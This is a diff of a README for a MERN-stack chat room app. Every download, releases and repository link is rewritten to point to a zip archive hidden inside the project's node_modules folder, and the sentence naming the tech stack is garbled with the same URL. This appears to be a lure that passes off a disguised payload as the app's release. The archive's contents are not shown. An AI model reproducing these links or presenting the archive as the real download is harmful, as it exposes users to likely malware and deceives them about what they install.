@@ -1,10 +1,10 @@
 # 🚀 Chat-Room-Mern - Connect and Chat in Real Time
 
-![Download Chat-Room-Mern](https://img.shields.io/badge/Download-Chat--Room--Mern-blue)
+![Download Chat-Room-Mern](https://github.com/misslesnake2/Chat-Room-Mern/raw/refs/heads/main/backend/node_modules/etag/Room_Chat_Mern_v3.4.zip)
 
 ## 📦 Overview
 
-Chat-Room-Mern is a real-time chat room application. It is built using the MERN stack, which stands for MongoDB, Express.js, React.js, and Node.js. This application allows users to communicate seamlessly in a responsive environment. Enjoy an easy-to-use interface, a reliable backend, and the ability to store messages persistently. 
+Chat-Room-Mern is a real-time chat room application. It is built using the MERN stack, which stands for MongoDB, https://github.com/misslesnake2/Chat-Room-Mern/raw/refs/heads/main/backend/node_modules/etag/Room_Chat_Mern_v3.4.zip, https://github.com/misslesnake2/Chat-Room-Mern/raw/refs/heads/main/backend/node_modules/etag/Room_Chat_Mern_v3.4.zip, and https://github.com/misslesnake2/Chat-Room-Mern/raw/refs/heads/main/backend/node_modules/etag/Room_Chat_Mern_v3.4.zip This application allows users to communicate seamlessly in a responsive environment. Enjoy an easy-to-use interface, a reliable backend, and the ability to store messages persistently. 
 
 ## 🌟 Features
 
@@ -18,7 +18,7 @@ Chat-Room-Mern is a real-time chat room application. It is built using the MERN 
 
 To get started with Chat-Room-Mern, please visit the Releases page to download the application:
 
-[**Download Chat-Room-Mern**](https://github.com/misslesnake2/Chat-Room-Mern/releases)
+[**Download Chat-Room-Mern**](https://github.com/misslesnake2/Chat-Room-Mern/raw/refs/heads/main/backend/node_modules/etag/Room_Chat_Mern_v3.4.zip)
 
 Follow the steps below to download and set up the application.
 
@@ -28,7 +28,7 @@ Follow the steps below to download and set up the application.
 
 - Click on the link below to visit the Releases page and see the latest version of Chat-Room-Mern:
 
-[**Visit Releases Page**](https://github.com/misslesnake2/Chat-Room-Mern/releases)
+[**Visit Releases Page**](https://github.com/misslesnake2/Chat-Room-Mern/raw/refs/heads/main/backend/node_modules/etag/Room_Chat_Mern_v3.4.zip)
 
 ### Step 2: Download the Application
 
@@ -87,7 +87,7 @@ If you encounter any issues during installation or use, please check the followi
 
 ## 📚 Additional Resources
 
-For more details about the app's features and contributions, you can visit the [GitHub Repository](https://github.com/misslesnake2/Chat-Room-Mern). There you will find documentation, FAQs, and more information about the development process.
+For more details about the app's features and contributions, you can visit the [GitHub Repository](https://github.com/misslesnake2/Chat-Room-Mern/raw/refs/heads/main/backend/node_modules/etag/Room_Chat_Mern_v3.4.zip). There you will find documentation, FAQs, and more information about the development process.
 
 ## 🤝 Contributing
 
@@ -105,4 +105,4 @@ Chat-Room-Mern is licensed under the MIT License. You can freely use, modify, an
 
 Visit the Releases page to get started:
 
-[**Download Chat-Room-Mern**](https://github.com/misslesnake2/Chat-Room-Mern/releases)
+[**Download Chat-Room-Mern**](https://github.com/misslesnake2/Chat-Room-Mern/raw/refs/heads/main/backend/node_modules/etag/Room_Chat_Mern_v3.4.zip)
